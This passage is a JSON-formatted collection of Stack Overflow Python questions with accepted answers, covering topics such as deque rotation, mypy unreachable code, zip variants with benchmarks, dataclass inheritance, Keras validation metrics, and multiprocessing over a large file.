GEMM_MULTITHREAD_THRESHOLD which is used in gemm.c (or gemv.c. Note that in the code, the k dimension matters but this is not what benchmarks show on my machine (possibly due to an older version of OpenBLAS being used). You can rebuild OpenBLAS with a smaller threshold (like 1 instead of 4).\nAn alternative solution is to use another BLAS implementation like BLIS or the Intel MKL that should use different threshold (possibly better ones). A last solution is to implement a specific implementation to efficiently compute the matrices of your code (possibly using Numba or Cython) but BLAS implementations are heavily optimized so it is often hard to actually write a faster code (unless you are very familiar with low-level optimizations, compilers, and modern processor architectures).\n\n"
}
{
    "Id": 72677648,
    "PostTypeId": 1,
    "Title": "How to iterate through list infinitely with +1 offset each loop",
    "Body": "I want to infinitely iterate through the list from 0 to the end, but in the next loop I want to start at 1 to the end plus 0, and the next loop would start at 2 to the end plus 0, 1, up to the last item where it would start again at 0 and go to the end.\nHere is my code:\na = [ 0, 1, 2 ]\noffset = 0\nrotate = 0\n\nwhile True:\n    print(a[rotate])\n    offset += 1\n    rotate += 1\n    if offset >= len(a):\n        offset = 0\n        rotate += 1\n    if rotate >= len(a):\n        rotate = 0\n\nThis is the solution I came up with so far. It's far from perfect.\nThe result that I want is:\n0, 1, 2 # first iteration\n1, 2, 0 # second iteration\n2, 0, 1 # third iteration\n0, 1, 2 # fourth iteration\n\nand so on.\n",
    "AcceptedAnswerId": 72683695,
    "AcceptedAnswer": "You can use a deque which has a built-in and efficient rotate function (~O(1)):\n>>> d = deque([0,1,2])\n>>> for _ in range(10):\n...     print(*d)\n...     d.rotate(-1)  # negative -> rotate to the left\n...\n0 1 2\n1 2 0\n2 0 1\n0 1 2\n1 2 0\n2 0 1\n0 1 2\n1 2 0\n2 0 1\n0 1 2\n\n"
}
{
    "Id": 72175135,
    "PostTypeId": 1,
    "Title": "mypy - How to mark line as unreachable",
    "Body": "I've got a function of the form:\ndef get_new_file(prefix: str) -> pathlib.Path:\n    for i in itertools.count(0):\n        p = pathlib.Path(f'{prefix}_{i}')\n        if not p.is_file():\n            return p\n    # This line is unreachable.\n\nmypy understandably complains that the function is missing a return statement.  Is there a way to mark a line so as to inform mypy that the line should be considered unreachable?\n",
    "AcceptedAnswerId": 72175249,
    "AcceptedAnswer": "This was raised as an issue. The recommended solution is assert False.\ndef get_new_file(prefix: str) -> pathlib.Path:\n    for i in itertools.count(0):\n        p = pathlib.Path(f'{prefix}_{i}')\n        if not p.is_file():\n            return p\n    assert False\n\n"
}
{
    "Id": 71102876,
    "PostTypeId": 1,
    "Title": "in ipython how do I accept and use an autocomplete suggestion?",
    "Body": "I'm using Python 3.8.9 with IPython 8.0.1 on macOS. When I type anything whatsoever, it displays a predicted suggestion based on past commands. Cool.\nHowever, how do I actually accept that suggestion? I tried the obvious: tab, which does not accept the suggestion, but rather opens up a menu with different suggestions, while the original suggestion is still there (see screenshot).\nI also tried space, and return, but both of those act as if the suggestion was never made. How the heck do I actually use the ipython autosuggestion? Or is tab supposed to work and something is wrong with my ipython build or something?\n\n",
    "AcceptedAnswerId": 71459528,
    "AcceptedAnswer": "CTRL-E, CTRL-F, or Right Arrow Key\nhttps://ipython.readthedocs.io/en/6.x/config/shortcuts/index.html\n"
}
{
    "Id": 71689095,
    "PostTypeId": 1,
    "Title": "How to solve the pytorch RuntimeError: Numpy is not available without upgrading numpy to the latest version because of other dependencies",
    "Body": "I am running a simple CNN using Pytorch for some audio classification on my Raspberry Pi 4 on Python 3.9.2 (64-bit). For the audio manipulation needed I am using librosa. librosa depends on the numba package which is only compatible with numpy version \nWhen running my code, the line\nspect_tensor = torch.from_numpy(spect).double()\n\nthrows the RuntimeError:\nRuntimeError: Numpy is not available\n\nSearching the internet for solutions I found upgrading Numpy to the latest version to resolve that specific error, but throwing another error, because Numba only works with Numpy \nIs there a solution to this problem which does not include searching for an alternative to using librosa?\n",
    "AcceptedAnswerId": 71750812,
    "AcceptedAnswer": "Just wanted to give an update on my situation. I downgraded torch to version 0.9.1 which solved the original issue. Now OpenBLAS is throwing a warning because of an open MPLoop. But for now my code is up and running.\n"
}
{
    "Id": 71520075,
    "PostTypeId": 1,
    "Title": "zip_longest for the left list always",
    "Body": "I know about the zip function (which will zip according to the shortest list) and zip_longest (which will zip according to the longest list), but how would I zip according to the first list, regardless of whether it's the longest or not?\nFor example:\nInput:  ['a', 'b', 'c'], [1, 2]\nOutput: [('a', 1), ('b', 2), ('c', None)]\n\nBut also:\nInput:  ['a', 'b'], [1, 2, 3]\nOutput: [('a', 1), ('b', 2)]\n\nDo both of these functionalities exist in one function?\n",
    "AcceptedAnswerId": 71520401,
    "AcceptedAnswer": "Solutions\nChaining the repeated fillvalue behind the iterables other than the first:\nfrom itertools import chain, repeat\n\ndef zip_first(first, *rest, fillvalue=None):\n    return zip(first, *map(chain, rest, repeat(repeat(fillvalue))))\n\nOr using zip_longest and trim it with a compress and zip trick:\ndef zip_first(first, *rest, fillvalue=None):\n    a, b = tee(first)\n    return compress(zip_longest(b, *rest, fillvalue=fillvalue), zip(a))\n\nJust like zip and zip_longest, these take any number (well, at least one) of any kind of iterables (including infinite ones) and return an iterator (convert to list if needed).\nBenchmark results\nBenchmarks with other equally general solutions (all code is at the end of the answer):\n10 iterables of 10,000 to 90,000 elements, first has 50,000:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n 2.2 ms   2.2 ms   2.3 ms  limit_cheat\n 2.6 ms   2.6 ms   2.6 ms  Kelly_Bundy_chain\n 3.3 ms   3.3 ms   3.3 ms  Kelly_Bundy_compress\n50.2 ms  50.6 ms  50.7 ms  CrazyChucky\n54.7 ms  55.0 ms  55.0 ms  Sven_Marnach\n74.8 ms  74.9 ms  75.0 ms  Mad_Physicist\n 5.4 ms   5.4 ms   5.4 ms  Kelly_Bundy_3\n 5.9 ms   6.0 ms   6.0 ms  Kelly_Bundy_4\n 4.6 ms   4.7 ms   4.7 ms  Kelly_Bundy_5\n\n10,000 iterables of 0 to 100 elements, first has 50:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n 4.6 ms   4.7 ms   4.8 ms  limit_cheat\n 4.8 ms   4.8 ms   4.8 ms  Kelly_Bundy_compress\n 8.4 ms   8.4 ms   8.4 ms  Kelly_Bundy_chain\n27.1 ms  27.3 ms  27.5 ms  CrazyChucky\n38.3 ms  38.5 ms  38.7 ms  Sven_Marnach\n73.0 ms  73.0 ms  73.1 ms  Mad_Physicist\n 4.9 ms   4.9 ms   5.0 ms  Kelly_Bundy_3\n 4.9 ms   4.9 ms   5.0 ms  Kelly_Bundy_4\n 5.0 ms   5.0 ms   5.0 ms  Kelly_Bundy_5\n\n\nThe first one is a cheat that knows the length, included to show what's probably a limit for how fast we can get.\nExplanations\nA little explanation of the above two solutions:\nThe first solution, if used with for example three iterables, is equivalent to this:\ndef zip_first(first, second, third, fillvalue=None):\n    filler = repeat(fillvalue)\n    return zip(first,\n               chain(second, filler),\n               chain(third, filler))\n\nThe second solution basically lets zip_longest do the job. The only problem with that is that it doesn't stop when the first iterable is done. So I duplicate the first iterable (with tee) and then use one for its elements and the other for its length. The zip(a) wraps every element in a 1-tuple, and non-empty tuples are true. So compress gives me all tuples produced by zip_longest, as many as there are elements in the first iterable.\nBenchmark code (Try it online!)\ndef limit_cheat(*iterables, fillvalue=None):\n    return islice(zip_longest(*iterables, fillvalue=fillvalue), cheat_length)\n\ndef Kelly_Bundy_chain(first, *rest, fillvalue=None):\n    return zip(first, *map(chain, rest, repeat(repeat(fillvalue))))\n\ndef Kelly_Bundy_compress(first, *rest, fillvalue=None):\n    a, b = tee(first)\n    return compress(zip_longest(b, *rest, fillvalue=fillvalue), zip(a))\n\ndef CrazyChucky(*iterables, fillvalue=None):\n    SENTINEL = object()\n    \n    for first, *others in zip_longest(*iterables, fillvalue=SENTINEL):\n        if first is SENTINEL:\n            return\n        others = [i if i is not SENTINEL else fillvalue for i in others]\n        yield (first, *others)\n\ndef Sven_Marnach(first, *rest, fillvalue=None):\n    rest = [iter(r) for r in rest]\n    for x in first:\n        yield x, *(next(r, fillvalue) for r in rest)\n\ndef Mad_Physicist(*args, fillvalue=None):\n    # zip_by_first('ABCD', 'xy', fillvalue='-') --> Ax By C- D-\n    # zip_by_first('ABC', 'xyzw', fillvalue='-') --> Ax By Cz\n    if not args:\n        return\n    iterators = [iter(it) for it in args]\n    while True:\n        values = []\n        for i, it in enumerate(iterators):\n            try:\n                value = next(it)\n            except StopIteration:\n                if i == 0:\n                    return\n                iterators[i] = repeat(fillvalue)\n                value = fillvalue\n            values.append(value)\n        yield tuple(values)\n\ndef Kelly_Bundy_3(first, *rest, fillvalue=None):\n    a, b = tee(first)\n    return map(itemgetter(1), zip(a, zip_longest(b, *rest, fillvalue=fillvalue)))\n\ndef Kelly_Bundy_4(first, *rest, fillvalue=None):\n    sentinel = object()\n    for z in zip_longest(chain(first, [sentinel]), *rest, fillvalue=fillvalue):\n        if z[0] is sentinel:\n            break\n        yield z\n\ndef Kelly_Bundy_5(first, *rest, fillvalue=None):\n    stopped = False\n    def stop():\n        nonlocal stopped\n        stopped = True\n        return\n        yield\n    for z in zip_longest(chain(first, stop()), *rest, fillvalue=fillvalue):\n        if stopped:\n            break\n        yield z\n\n\nimport timeit\nfrom itertools import chain, repeat, zip_longest, islice, tee, compress\nfrom operator import itemgetter\nfrom collections import deque\n\nfuncs = [\n    limit_cheat,\n    Kelly_Bundy_chain,\n    Kelly_Bundy_compress,\n    CrazyChucky,\n    Sven_Marnach,\n    Mad_Physicist,\n    Kelly_Bundy_3,\n    Kelly_Bundy_4,\n    Kelly_Bundy_5,\n]\n\ndef test(args_creator):\n\n    # Correctness\n    expect = list(funcs[0](*args_creator()))\n    for func in funcs:\n        result = list(func(*args_creator()))\n        print(result == expect, func.__name__)\n    \n    # Speed\n    tss = [[] for _ in funcs]\n    for _ in range(5):\n        print()\n        print(args_creator.__name__)\n        for func, ts in zip(funcs, tss):\n            t = min(timeit.repeat(lambda: deque(func(*args_creator()), 0), number=1))\n            ts.append(t)\n            print(*('%4.1f ms ' % (t * 1e3) for t in sorted(ts)[:3]), func.__name__)\n\ndef args_few_but_long_iterables():\n    global cheat_length\n    cheat_length = 50_000\n    first = repeat(0, 50_000)\n    rest = [repeat(i, 10_000 * i) for i in range(1, 10)]\n    return first, *rest\n\ndef args_many_but_short_iterables():\n    global cheat_length\n    cheat_length = 50\n    first = repeat(0, 50)\n    rest = [repeat(i, i % 101) for i in range(1, 10_000)]\n    return first, *rest\n\ntest(args_few_but_long_iterables)\nfuncs[1:3] = funcs[1:3][::-1]\ntest(args_many_but_short_iterables)\n\n"
}
{
    "Id": 72472220,
    "PostTypeId": 1,
    "Title": "dataclass inheritance: Fields without default values cannot appear after fields with default values",
    "Body": "Context\nI created two data classes to handle table metadata. TableMetadata apply to any kind of tables, while RestTableMetadata contains information relevant for data extracted from REST apis\n@dataclass\nclass TableMetadata:\n    \"\"\"\n    - entity: business entity represented by the table\n    - origin: path / query / url from which data withdrawn\n    - id: field to be used as ID (unique)\n    - historicity: full, delta\n    - upload: should the table be uploaded\n    \"\"\"\n\n    entity: str\n    origin: str\n    view: str\n    id: str = None\n    historicity: str = \"full\"\n    upload: bool = True\n    columns: list = field(default_factory=list)\n\n\n@dataclass\nclass RestTableMetadata(TableMetadata):\n    \"\"\"\n    - method: HTTP method to be used\n    - payloadpath: portion of the response payload to use to build the dataframe\n    \"\"\"\n\n    method: str\n    payloadpath: str = None\n\nProblem\nBecause of inheritance, method (without default values) comes after columns, resulting in the following Pylance error: Fields without default values cannot appear after fields with default values\nI'm looking for a way to fix it without overriding __init__ (if there is such a way). I also noticed a method called __init_subclass__ (This method is called when a class is subclassed.) that might affect how RestTableMetadata.__init__ and other subclasses is generated.\n",
    "AcceptedAnswerId": 72715549,
    "AcceptedAnswer": "Here is a working solution for python > 3.10\n@dataclass(kw_only=True)\nclass TableMetadata:\n    \"\"\"\n    - entity: business entity represented by the table\n    - origin: path / query / url from which data withdrawn\n    - id: field to be used as ID (unique)\n    - historicity: full, delta\n    - upload: should the table be uploaded\n    \"\"\"\n\n    entity: str\n    origin: str\n    view: str\n    id: str = None\n    historicity: str = \"full\"\n    upload: bool = True\n    columns: list = field(default_factory=list)\n\n\n@dataclass(kw_only=True)\nclass RestTableMetadata(TableMetadata):\n    \"\"\"\n    - method: HTTP method to be used\n    - payloadpath: portion of the response payload to use to build the dataframe\n    \"\"\"\n\n    method: str\n    payloadpath: str = None\n\n"
}
{
    "Id": 72202728,
    "PostTypeId": 1,
    "Title": "Conda to poetry environment",
    "Body": "I have a conda environment that I would like to convert to a poetry environment.\nWhat I have tried is to translate the environment.yaml of the conda environment into a pyproject.toml file that poetry can read. Here you have the steps:\n\nGenerate the yaml file\nconda env export --from-history > environment.yaml\nThe --from-history flag includes only the packages that I explicitly asked for. Here it is how the file looks like after installing numpy.\n# environment.yaml\n\nname: C:\\Users\\EDOCIC\\Screepts\\My_projects\\Tests\\conda2poetry\\condaenv\nchannels:\n  - defaults\ndependencies:\n  - numpy\n\n\nManually create the pyproject.toml file out of environment.yaml. I added the numpy version, which I got from conda env export. Here it is the result:\n# pyproject.toml\n\n[tool.poetry]\nname = \"conda2poetry\"\nversion = \"0.1.0\"\ndescription = \"\"\nauthors = [\"\"]\n\n[tool.poetry.dependencies]\npython = \"~3.7\"\nnumpy = \"^1.21.5\"\n\n[tool.poetry.dev-dependencies]\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\n\nCreate the environment with poetry init, which will automatically read the toml file.\n\n\nThe process seems to work but it's quite manual and prone to mistakes.\nIs there a better way?\n",
    "AcceptedAnswerId": 72204094,
    "AcceptedAnswer": "No, there is not a better way. Conda is a generic package manager and does not discern Python versus non-Python packages, therefore this has to be done with manual curation.\nAdditionally, package names might also differ. For example py-opencv(conda-forge) vs opencv-python (PyPi).\nTips\nIn addition to pulling down the --from-history YAML, it may also help to dump out a pip list --format=freeze. This could help with resolving any tricky packages that use different names in Conda versus PyPI.\nIf the environment uses any PyPI packages directly, this won't be seen from a conda env export --from-history. However, these will appear when using conda list (entries with channel pypi) or plain conda env export, which would have a dependencies.pip: section if there are any.\n"
}
{
    "Id": 71412499,
    "PostTypeId": 1,
    "Title": "How to prevent Keras from computing metrics during training",
    "Body": "I'm using Tensorflow/Keras 2.4.1 and I have a (unsupervised) custom metric that takes several of my model inputs as parameters such as:\nmodel = build_model() # returns a tf.keras.Model object\nmy_metric = custom_metric(model.output, model.input[0], model.input[1])\nmodel.add_metric(my_metric)\n[...]\nmodel.fit([...]) # training with fit\n\nHowever, it happens that custom_metric is very expensive so I would like it to be computed during validation only. I found this answer but I hardly understand how I can adapt the solution to my metric that uses several model inputs as parameter since the update_state method doesn't seem flexible.\nIn my context, is there a way to avoid computing my metric during training, aside from writing my own training loop ?\nAlso, I am very surprised we cannot natively specify to Tensorflow that some metrics should only be computed at validation time, is there a reason for that ?\nIn addition, since the model is trained to optimize the loss, and that the training dataset should not be used to evaluate a model, I don't even understand why, by default, Tensorflow computes metrics during training.\n",
    "AcceptedAnswerId": 71564427,
    "AcceptedAnswer": "I think that the simplest solution to compute a metric only on the validation is using a custom callback.\nhere we define our dummy callback:\nclass MyCustomMetricCallback(tf.keras.callbacks.Callback):\n\n    def __init__(self, train=None, validation=None):\n        super(MyCustomMetricCallback, self).__init__()\n        self.train = train\n        self.validation = validation\n\n    def on_epoch_end(self, epoch, logs={}):\n\n        mse = tf.keras.losses.mean_squared_error\n\n        if self.train:\n            logs['my_metric_train'] = float('inf')\n            X_train, y_train = self.train[0], self.train[1]\n            y_pred = self.model.predict(X_train)\n            score = mse(y_train, y_pred)\n            logs['my_metric_train'] = np.round(score, 5)\n\n        if self.validation:\n            logs['my_metric_val'] = float('inf')\n            X_valid, y_valid = self.validation[0], self.validation[1]\n            y_pred = self.model.predict(X_valid)\n            val_score = mse(y_pred, y_valid)\n            logs['my_metric_val'] = np.round(val_score, 5)\n\nGiven this dummy model:\ndef build_model():\n\n  inp1 = Input((5,))\n  inp2 = Input((5,))\n  out = Concatenate()([inp1, inp2])\n  out = Dense(1)(out)\n\n  model = Model([inp1, inp2], out)\n  model.compile(loss='mse', optimizer='adam')\n\n  return model\n\nand this data:\nX_train1 = np.random.uniform(0,1, (100,5))\nX_train2 = np.random.uniform(0,1, (100,5))\ny_train = np.random.uniform(0,1, (100,1))\n\nX_val1 = np.random.uniform(0,1, (100,5))\nX_val2 = np.random.uniform(0,1, (100,5))\ny_val = np.random.uniform(0,1, (100,1))\n\nyou can use the custom callback to compute the metric both on train and validation:\nmodel = build_model()\n\nmodel.fit([X_train1, X_train2], y_train, epochs=10, \n          callbacks=[MyCustomMetricCallback(train=([X_train1, X_train2],y_train), validation=([X_val1, X_val2],y_val))])\n\nonly on validation:\nmodel = build_model()\n\nmodel.fit([X_train1, X_train2], y_train, epochs=10, \n          callbacks=[MyCustomMetricCallback(validation=([X_val1, X_val2],y_val))])\n\nonly on train:\nmodel = build_model()\n\nmodel.fit([X_train1, X_train2], y_train, epochs=10, \n          callbacks=[MyCustomMetricCallback(train=([X_train1, X_train2],y_train))])\n\nremember only that the callback evaluates the metrics one-shot on the data, like any metric/loss computed by default by keras on the validation_data.\nhere is the running code.\n"
}
{
    "Id": 71791008,
    "PostTypeId": 1,
    "Title": "np.cumsum(df['column']) treatment of nans",
    "Body": "np.cumsum([1, 2, 3, np.nan, 4, 5, 6]) will return nan for every value after the first np.nan. Moreover, it will do the same for any generator. However, np.cumsum(df['column']) will not. What does np.cumsum(...) do, such that dataframes are treated specially?\nIn [2]: df = pd.DataFrame({'column': [1, 2, 3, np.nan, 4, 5, 6]})\n\nIn [3]: np.cumsum(df['column'])\nOut[3]: \n0     1.0\n1     3.0\n2     6.0\n3     NaN\n4    10.0\n5    15.0\n6    21.0\nName: column, dtype: float64\n\n",
    "AcceptedAnswerId": 71791193,
    "AcceptedAnswer": "When you call np.cumsum(object) with an object that is not a numpy array, it will try calling object.cumsum() See this thread for details\n. You can also see it in the Numpy source.\nThe pandas method has a default of skipna=True. So np.cumsum(df) gets turned into the equivalent of df.cumsum(axis=None, skipna=True, *args, **kwargs), which, of course skips the NaN values. The Numpy method does not have a skipna option.\nYou can also verify this yourself by overriding the pandas method with your own:\nclass DF(pd.DataFrame):\n    def cumsum(self, axis=None, skipna=True, *args, **kwargs):\n        print('calling pandas cumsum')\n        return super().cumsum(axis=None, skipna=True, *args, **kwargs)\n\ndf = DF({'column': [1, 2, 3, np.nan, 4, 5, 6]})\n\n# does calling the numpy function call your pandas method?   \nnp.cumsum(df)\n\nThis will print\ncalling pandas cumsum\n\nand return the expected result:\n    column\n0   1.0\n1   3.0\n2   6.0\n3   NaN\n4   10.0\n5   15.0\n6   21.0\n\nYou can then experiment with the result of changing skipna=True.\n"
}
{
    "Id": 71580859,
    "PostTypeId": 1,
    "Title": "ImportError when importing psycopg2 on M1",
    "Body": "Has anyone gotten this error when importing psycopg2 after successful installation?\nImportError: dlopen(/Users/chrishicks/Desktop/test/venv/lib/python3.9/site-packages/psycopg2/_psycopg.cpython-39-darwin.so, 0x0002):\ntried: '/Users/chrishicks/Desktop/test/venv/lib/python3.9/site-packages/psycopg2/_psycopg.cpython-39-darwin.so'\n(mach-o file, but is an incompatible architecture\n(have 'x86_64', need 'arm64e')),\n'/usr/local/lib/_psycopg.cpython-39-darwin.so' (no such file),\n'/usr/lib/_psycopg.cpython-39-darwin.so' (no such file)\n\nI have tried installing psycopg2 and psycopg2-binary and have tried both while running iTerm in Rosetta.\n",
    "AcceptedAnswerId": 71581113,
    "AcceptedAnswer": "Using this line should fix it:\npip3.9 install psycopg2-binary --force-reinstall --no-cache-dir\n\n"
}
{
    "Id": 71803409,
    "PostTypeId": 1,
    "Title": "VSCode: how to interrupt a running Python test?",
    "Body": "I'm using VSCode Test Explorer to run my Python unit tests. There was a bug in my code and my tested method never finishes.\nHow do I interrupt my test? I can't find how to do it using the GUI. I had to close VSCode to interrupt it.\nI'm using pytest framework.\n",
    "AcceptedAnswerId": 71803605,
    "AcceptedAnswer": "Silly me, here is the Stop button at the top right of the the Testing tab:\n\n"
}
{
    "Id": 71630563,
    "PostTypeId": 1,
    "Title": "Syntax for making objects callable in python",
    "Body": "I understand that in python user-defined objects can be made callable by defining a __call__() method in the class definition. For example,\nclass MyClass:\n  def __init__(self):\n    pass\n\n  def __call__(self, input1):\n    self.my_function(input1)\n\n  def my_function(self, input1):\n    print(f\"MyClass - print {input1}\")\n\nmy_obj = MyClass()\n# same as calling my_obj.my_function(\"haha\")\nmy_obj(\"haha\") # prints \"MyClass - print haha\"\n\nI was looking at how pytorch makes the forward() method of a nn.Module object be called implicitly when the object is called and saw some syntax I didn't understand.\nIn the line that supposedly defines the __call__ method the syntax used is,\n__call__ : Callable[..., Any] = _call_impl\n\nThis seemed like a combination of an annotation (keyword Callable[ following : ignored by python) and a value of _call_impl which we want to be called when __call__ is invoked, and my guess is that this is a shorthand for,\ndef __call__(self, *args, **kwargs):\n    return self._call_impl(*args, **kwargs)\n\nbut wanted to understand clearly how this method of defining functions worked.\nMy question is: When would we want to use such a definition of callable attributes of a class instead of the usual def myfunc(self, *args, **kwargs)\n",
    "AcceptedAnswerId": 71630606,
    "AcceptedAnswer": "Functions are normal first-class objects in python. The name to with which you define a function object, e.g. with a def statement, is not set in stone, any more than it would be for an int or list. Just as you can do\na = [1, 2, 3]\nb = a\n\nto access the elements of a through the name b, you can do the same with functions. In your first example, you could replace\ndef __call__(self, input1):\n    self.my_function(input1)\n\nwith the much simpler\n__call__ = my_function\n\nYou would need to put this line after the definition of my_function.\nThe key differences between the two implementations is that def __call__(... creates a new function. __call__ = ... simply binds the name __call__ to the same object as my_function. The noticeable difference is that if you do __call__.__name__, the first version will show __call__, while the second will show my_function, since that's what gets assigned by a def statement.\n"
}
{
    "Id": 71823279,
    "PostTypeId": 1,
    "Title": "Python Read huge file line per line and send it to multiprocessing or thread",
    "Body": "I have been trying to get my code to work for many days,\nI am desperate.\nI've scoured the internet, but I still can't find it.\nI have a text file encoded in \"latin-1\" of 9GB -> 737 022 387 lines, each line contains a string.\nI would like to read each line and send them in an http PUT request that waits for a response, and returns TRUE or FALSE if the response is 200 or 400\nThe PUT request takes about 1 to 3 seconds, so to speed up the processing time I would like to use either a Thread or a multiprocessing.\nTo start, I simulate my PUT request with a sleep of 3 seconds.\nand even that I can't get it to work\nThis code split my string into char, i don't know why...\nfrom multiprocessing import Pool\nfrom time import sleep\n\n\ndef process_line(line):\n   sleep(3)\n   print(line)\n   return True\n\nif __name__ == \"__main__\":\n    pool = Pool(2)\n    peon =  open(r'D:\\txtFile',encoding=\"latin-1\")\n    for line in peon:\n        res = pool.map(process_line,line )\n        print(res)\n\nThis give error : TypeError: process_line() takes 1 positional argument but 17 were given\nimport multiprocessing\nfrom multiprocessing import Pool\nfrom time import sleep\n\n\ndef process_line(line):\n   sleep(3)\n   print(line)\n   return True\n\nif __name__ == \"__main__\":\n    pool = Pool(2)\n    with open(r\"d:\\txtFile\",encoding=\"latin-1\") as file:\n        res = pool.apply(process_line,file.readline() )\n        print(res)\n\nthat : Crash the computer\nfrom multiprocessing import Pool\nfrom time import sleep\n\n\ndef process_line(line):\n   sleep(3)\n   print(line)\n   return True\n\nif __name__ == \"__main__\":\n    pool = Pool(2)\n    peon =  open(r'D:\\txtFile',encoding=\"latin-1\")\n    for line in peon:\n        res = pool.map(process_line,peon )\n        print(res)\n\n",
    "AcceptedAnswerId": 71824107,
    "AcceptedAnswer": "Although the problem seems unrealistic though. shooting 737,022,387 requests! calculate how many months it'll take from single computer!!\nStill, Better way to do this task is to read line by line from file in a separate thread and insert into a queue. And then multi-process the queue.\nSolution 1:\nfrom multiprocessing import Queue, Process\nfrom threading import Thread\nfrom time import sleep\n\nurls_queue = Queue()\nmax_process = 4\n\ndef read_urls():\n    with open('urls_file.txt', 'r') as f:\n        for url in f:\n            urls_queue.put(url.strip())\n            print('put url: {}'.format(url.strip()))\n\n    # put DONE to tell send_request_processor to exit\n    for i in range(max_process):\n        urls_queue.put(\"DONE\")\n\n\ndef send_request(url):\n    print('send request: {}'.format(url))\n    sleep(1)\n    print('recv response: {}'.format(url))\n\n\ndef send_request_processor():\n    print('start send request processor')\n    while True:\n        url = urls_queue.get()\n        if url == \"DONE\":\n            break\n        else:\n            send_request(url)\n\n\ndef main():\n    file_reader_thread = Thread(target=read_urls)\n    file_reader_thread.start()\n\n    procs = []\n    for i in range(max_process):\n        p = Process(target=send_request_processor)\n        procs.append(p)\n        p.start()\n\n    for p in procs:\n        p.join()\n\n    print('all done')\n    # wait for all tasks in the queue\n    file_reader_thread.join()\n\n\nif __name__ == '__main__':\n    main()\n\nDemo: https://onlinegdb.com/Elfo5bGFz\nSolution 2:\nYou can use tornado asynchronous networking library\nfrom tornado import gen\nfrom tornado.ioloop import IOLoop\nfrom tornado.queues import Queue\n\nq = Queue(maxsize=2)\n\nasync def consumer():\n    async for item in q:\n        try:\n            print('Doing work on %s' % item)\n            await gen.sleep(0.01)\n        finally:\n            q.task_done()\n\nasync def producer():\n    with open('urls_file.txt', 'r') as f:\n        for url in f:\n            await q.put(url)\n            print('Put %s' % item)\n\nasync def main():\n    # Start consumer without waiting (since it never finishes).\n    IOLoop.current().spawn_callback(consumer)\n    await producer()     # Wait for producer to put all tasks.\n    await q.join()       # Wait for consumer to finish all tasks.\n    print('Done')\n    # producer and consumer can run in parallel\n\nIOLoop.current().run_sync(main)\n\n"
}
{
    "Id": 71655179,
    "PostTypeId": 1,
    "Title": "How can I make an object with an interface like a random number generator, but that actually generates a specified sequence?",
    "Body": "I'd like to construct an object that works like a random number generator, but generates numbers in a specified sequence.\n# a random number generator\nrng = lambda : np.random.randint(2,20)//2\n\n# a non-random number generator\ndef nrng():\n    numbers = np.arange(1,10.5,0.5)\n    for i in range(len(numbers)):\n        yield numbers[i]\n\nfor j in range(10):\n    print('random number', rng())\n    print('non-random number', nrng())\n\nThe issue with the code above that I cannot call nrng in the last line because it is a generator. I know that the most straightforward way to rewrite the code above is to simply loop over the non-random numbers instead of defining the generator. I would prefer getting the example above to work because I am working with a large chunk of code that include a function that accepts a random number generator as an argument, and I would like to add the functionality to pass non-random number sequences without rewriting the entire code.\nEDIT: I see some confusion in the comments. I am aware that python's random number generators generate pseudo-random numbers. This post is about replacing a pseudo-random-number generator by a number generator that generates numbers from a non-random, user-specified sequence (e.g., a generator that generates the number sequence 1,1,2,2,1,0,1 if I want it to).\n",
    "AcceptedAnswerId": 71655539,
    "AcceptedAnswer": "Edit:\nThe cleanest way to do this would be to use a lambda to wrap your call to next(nrng) as per great comment from @GACy20:\ndef nrng_gen():\n    yield from range(10)\n\nnrng = nrng_gen()\n\nnrng_func = lambda: next(nrng)\n\nfor i in range(10):\n    print(nrng_func())\n\nOriginal answer:\nIf you want your object to keep state and look like a function, create a custom class with __call__ method.\neg.\nclass NRNG:\n    def __init__(self):\n        self.numbers = range(10)\n        self.state = -1\n    def __call__(self):\n        self.state += 1\n        return self.numbers[self.state]\n        \nnrng = NRNG()\n\n\nfor i in range(10):\n    print(nrng())\n\nHowever, I wouldn't recommend this unless absolutely necessary, as it obscures the fact that your nrng keeps a state (although technically, most rngs keep their state internally).\nIt's best to just use a regular generator with yield by calling next on it or to write a custom iterator (also class-based). Those will work with things like for loops and other python tools for iteration (like the excellent itertools package).\n"
}
{
    "Id": 71656644,
    "PostTypeId": 1,
    "Title": "Python type hint for Iterable[str] that isn't str",
    "Body": "In Python, is there a way to distinguish between strings and other iterables of strings?\nA str is valid as an Iterable[str] type, but that may not be the correct input for a function. For example, in this trivial example that is intended to operate on sequences of filenames:\nfrom typing import Iterable\n\ndef operate_on_files(file_paths: Iterable[str]) -> None:\n    for path in file_paths:\n        ...\n\nPassing in a single filename would produce the wrong result but would not be caught by type checking. I know that I can check for string or byte types at runtime, but I want to know if it's possible to catch silly mistakes like that with a type-checking tool.\nI've looked over the collections.abc module and there doesn't seem to be any abc that would include typical iterables (e.g. lists, tuples) but exclude strings. Similarly, for the typing module, there doesn't seem to be a type for iterables that don't include strings.\n",
    "AcceptedAnswerId": 71657094,
